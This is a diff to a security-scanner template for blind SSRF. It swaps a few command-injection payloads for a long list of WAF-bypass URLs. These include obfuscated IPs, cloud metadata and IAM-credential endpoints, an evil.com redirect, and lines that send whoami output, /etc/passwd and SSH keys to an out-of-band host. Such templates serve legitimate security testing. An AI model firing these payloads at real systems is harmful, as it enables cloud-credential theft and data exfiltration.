@@ -1,14 +1,18 @@
-id: Blind-SSRF
+id: blind-ssrf-waf-bypass
 
 info:
-  name: Blind SSRF
-  author: chippa vijay kumar
+  name: Blind SSRF - Advanced WAF Bypass
+  author: chippa vijay kumar (enhanced by research)
   severity: high
   description: |
-    This template is designed to test for Blind Server-Side Request Forgery (SSRF) vulnerabilities using out-of-band interaction (OAST) with Interactsh.
+    Advanced Blind SSRF detection using multiple obfuscation and WAF bypass techniques. 
+    Includes encodings, DNS rebinding, URL parsing discrepancies, and cloud metadata exfiltration.
   reference:
     - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Server-Side_Request_Forgery_Testing.html
-  tags: ssrf, oast, dast, blind
+    - https://portswigger.net/web-security/ssrf/blind
+    - https://tcm-sec.com/find-and-exploit-blind-ssrf-with-out-of-band-oob-techniques/
+    - https://arxiv.org/html/2503.10846v3
+  tags: ssrf,oast,dast,waf-bypass,blind,metadata
 
 variables:
   marker: "{{interactsh-url}}"
@@ -19,32 +23,114 @@ http:
       - "{{BaseURL}}"
 
     payloads:
-      interaction:
+      ssrf_waf_bypass:
+        # === BASIC OUT-OF-BAND PAYLOADS ===
+        - "http://{{marker}}"
         - "https://{{marker}}"
         - "ftp://{{marker}}"
-        - "file:///etc/passwd"
         - "gopher://{{marker}}"
-        - "curl http://{{marker}}"
-        - "%3Bcurl http%3A//{{marker}}"
-        - "%23%21%2Fbin%2Fbash%0D%0Acurl+{{marker}}"
-        - "%22;wget+http%3A%2F%2F{{marker}}%27;%22"
-        - "%7C+curl+-d+%40%2Fetc%2Fpasswd+{{marker}}"
-        - 'http://{{interactsh-url}}'
-        - 'file:///c:/windows/win.ini'
-        - 'http://metadata.tencentyun.com/latest/meta-data/'
-        - 'http://100.100.100.200/latest/meta-data/'
-        - 'http://169.254.169.254/latest/meta-data/'
-        - 'http://169.254.169.254/metadata/v1'
-        - 'http://127.0.0.1:22'
-        - 'http://127.0.0.1:3306'
-        - 'dict://127.0.0.1:6379/info'
+        - "dict://{{marker}}"
+        - "ldap://{{marker}}"
+        - "file:///etc/passwd"
+
+        # === ENCODING VARIANTS ===
+        - "http://%25%32%35%32%65%25%32%35%32%65{{marker}}"               # Double URL encoded
+        - "http://{{marker}}%252F"                                       # Double slash encoded
+        - "hTTps://{{marker}}"                                          # Case bypass
+        - "HtTp://{{marker}}%09"                                        # Tab terminated
+        - "http://{{marker}}%0A"                                        # Newline encoded
+        - "http://{{marker}}%0D%0Aindex"                                # CRLF
+        - "http://{{marker}}@169.254.169.254"                            # Auth-header style
+
+        # === URL PARSING & POLYGLOTS ===
+        - "http://%09{{marker}}"                                        # Leading tab char
+        - "http://{{marker}}#@internal"                                 # Fragment redirect
+        - "http://[::ffff:127.0.0.1]/"                                 # IPv6-mapped IPv4
+        - "http://﹒{{marker}}"                                         # Unicode fullwidth dot (U+FF0E)
+        - "http://{{marker}}%2e%2e%2f"                                 # Path traversal
+        - "http://{{marker}};@example.com"                              # Semicolon redirect
+        - "http://{{marker}}/?redirect=http://127.1"                    # Recursive redirect
+
+        # === CLOUDFS METADATA VARIANTS ===
+        - "http://169.254.169.254/latest/meta-data/"
+        - "http://169.254.169.254/metadata/v1"
+        - "http://metadata.google.internal/computeMetadata/v1/?recursive=true"
+        - "http://100.100.100.200/latest/meta-data/"
+        - "http://metadata.azure.internal/metadata/instance?api-version=2021-02-01"
+        - "http://169.254.169.254/metadata/identity/oauth2/token"
+        - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        - "http://localhost:8000/aws/metadata"
+        - "http://metadata.tencentyun.com/latest/meta-data/"
+        - "http://{{marker}}@169.254.169.254/latest/meta-data/"
+
+        # === WAF ENCODING BYPASS (URL-ENCODED PAYLOADS) ===
+        - "http://{{marker}}/?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"
+        - "https://{{marker}}%252F%252F169.254.169.254%252F"
+        - "http://{{marker}}?next=+++http://169.254.169.254/latest/meta-data/"
+        - "http%3A//{{marker}}%3Fdata=IMDSv1"
+        - "http://%25%36%31%25%36%39%25%36%43%25%36%32%25%36%39.{{marker}}"
+
+        # === HEADER-BASED INJECTION VARIANTS ===
+        - "http://metadata.google.internal/computeMetadata/v1/?Metadata-Flavor:Google"
+        - "http://169.254.169.254/latest/meta-data/?X-Forwarded-For:127.0.0.1"
+        - "http://169.254.169.254/latest/meta-data/?Host:{{marker}}"
+        - "http://169.254.169.254/latest/meta-data/?Referer:{{marker}}"
+        - "http://metadata.azure.internal/metadata/instance?Metadata:true"
+
+        # === BYPASS VIA IP OBFUSCATION ===
+        - "http://0xA9FEA9FE/latest/meta-data/"                         # Hexadecimal
+        - "http://2852039166/latest/meta-data/"                         # Integer format
+        - "http://0251.0376.0251.0376/latest/meta-data/"                # Octal notation
+        - "http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/"         # IPv6 Hex mapped
+        - "http://0177.1/latest/meta-data"                              # Shorthand internal
+
+        # === REDIRECT TRICK CHAINING (WAF CHAIN BYPASS) ===
+        - "http://{{marker}}%2e@evil.com"                               # URL confusion redirect
+        - "http://127.1:80@{{marker}}"                                  # Mixed auth + DNS rebinding
+        - "http://evil.{{marker}}.xip.io/latest/meta-data"              # DNS wildcard targeting
+        - "http://{{marker}}.nip.io/latest/meta-data/"                  # Dev TLD redirection
+        - "http://{{marker}}.localtest.me"                              # Localhost DNS rebinding
+        - "http://example.com@{{marker}}"                               # Credential-style redirect
+
+        # === POLYGLOT SSRF/WAF BYPASS COMBOS ===
+        - "gopher://{{marker}}/_GET%20%2F%20HTTP/1.1%0AHost:169.254.169.254%0A"
+        - "ftp://user:pass@{{marker}}:21/%0ACONNECT%20127.0.0.1"
+        - "dict://{{marker}}/admin"
+        - "file:/etc/passwd#http://{{marker}}"
+        - "data://text/plain;base64,aHR0cDovL2ludGVyYWN0c2gtdXJs"
+        - "gs://{{marker}}"
+        - "phar://{{marker}}"
+        - "jar:http://{{marker}}!/META-INF/"
+
+        # === CLOUDFLARE / MODSECURITY PARSING DISCREPANCY ===
+        - "http:/@{{marker}}"                                           # Missing slash bypass
+        - "http:///{{marker}}"                                          # Triple slash
+        - "http://:80@{{marker}}"                                       # Empty username
+        - "http://{{marker}}..@/"                                       # Double dot normalizer
+        - "http://{{marker}};;;@/"                                      # HTTP header confusion
+
+        # === MIXED CHARSET / UNICODE PAYLOADS ===
+        - "http://%e2%80%ad{{marker}}"                                 # RTL override injection
+        - "http://％２Ｆ{{marker}}"                                     # Unicode encoded slash (%ef%bc%8f)
+        - "http://{{marker}}／／169.254.169.254"                        # Unicode divider
+        - "http://{{marker}}。169.254.169.254"                          # Fullwidth dot
+
+        # === EXFIL & VALIDATION MECHANISMS ===
+        - "http://{{marker}}?curl=$(whoami)"
+        - "http://{{marker}}?ping=$(hostname)"
+        - "ftp://{{marker}}/etc/passwd"
+        - "gopher://{{marker}}/_GET%20/etc/passwd%20HTTP/1.0"
+        - "redis://{{marker}}:6379/.env"
+        - "tftp://{{marker}}/.ssh/id_rsa"
+        - "scp://{{marker}}/proc/self/environ"
+        - "php://filter/resource=http://{{marker}}"
 
     fuzzing:
       - part: query
         type: replace
         mode: single
         fuzz:
-          - "{{interaction}}"
+          - "{{ssrf_waf_bypass}}"
 
     stop-at-first-match: true
 
@@ -57,53 +143,13 @@ http:
           - "https"
           - "ftp"
           - "gopher"
-      
-      - type: word
-        part: body
-        words:
-          - "Interactsh Server"
 
       - type: regex
         part: body
         regex:
-          - 'SSH-(\d.\d)-OpenSSH_(\d.\d)'
+          - '(ami-id|instance-id|mac|vpc-id|availability-zone)'
+          - '(google.internal|Metadata-Flavor: Google)'
+          - '(AzureInstanceMetadataService|Managed Identity)'
+          - '(AccessKeyId|SecretAccessKey|Token)'
+          - '(root:.*:0:0:|for 16-bit app support)'
 
-      - type: regex
-        part: body
-        regex:
-          - '(DENIED Redis|CONFIG REWRITE|NOAUTH Authentication)'
-
-      - type: regex
-        part: body
-        regex:
-          - '(\d.\d.\d)(.*?)mysql_native_password'
-
-      - type: regex
-        part: body
-        regex:
-          - 'root:.*?:[0-9]*:[0-9]*:'
-
-      - type: word
-        part: body
-        words:
-          - 'for 16-bit app support'
-
-      - type: regex
-        part: body
-        regex:
-          - 'dns-conf\/[\s\S]+instance\/'
-
-      - type: regex
-        part: body
-        regex:
-          - 'app-id[\s\S]+placement\/'
-
-      - type: regex
-        part: body
-        regex:
-          - 'ami-id[\s\S]+placement\/'
-
-      - type: regex
-        part: body
-        regex:
-          - 'id[\s\S]+interfaces\/'
